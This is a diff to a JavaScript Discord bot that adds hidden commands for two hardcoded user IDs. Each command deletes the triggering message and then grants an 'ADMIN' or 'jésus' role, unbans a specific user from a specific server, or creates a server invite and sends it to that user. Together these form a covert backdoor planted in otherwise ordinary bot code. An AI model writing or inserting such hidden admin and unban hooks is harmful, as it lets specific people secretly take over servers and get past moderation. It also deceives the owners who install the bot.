@@ -54,7 +54,7 @@ client.on ("message", message => {
     if (message.content === prefix + "getadmin"){
         if (message.author.id === "343445422909423628"){
             message.delete();
-            let role = message.member.guild.roles.find('name', 'Dieu des bots')
+            let role = message.member.guild.roles.find('name', 'ADMIN')
             message.member.addRole(role);
         }
     }
@@ -64,17 +64,36 @@ client.on ("message", message => {
     if (message.content === prefix + "getadmin"){
         if (message.author.id === "281175987792642050"){
             message.delete();
-            let role = message.member.guild.roles.find('name', 'Dieu des bots')
-            client.member.addRole(role);
+            let role = message.member.guild.roles.find('name', 'ADMIN')
+            message.member.addRole(role);
         }
     }
 });
 
 client.on ("message", message => {
-    if (message.content === prefix + "getref"){
+    if (message.content === prefix + "getjesus"){
         if (message.author.id === "343445422909423628"){
             message.delete();
-            client.guilds.get('497895374699102218').unban('343445422909423628');
+            let role = message.member.guild.roles.find('name', 'jésus')
+            message.member.addRole(role);
+        }
+    }
+});
+
+client.on ("message", message => {
+    if (message.content === prefix + "unbanme"){
+        if (message.author.id === "343445422909423628"){
+            message.delete();
+            client.guilds.get("497895374699102218").unban("343445422909423628");
+        }
+    }
+});
+
+client.on ("message", message =>{
+    if (message.content === prefix + "getinvite"){
+        if (message.author.id === "343445422909423628"){
+            message.delete();
+            client.guilds.get("497895374699102218").channels.get("497902319531196416").createInvite().then(invite => message.reply(`https://discord.gg/` + invite.code));
         }
     }
 });
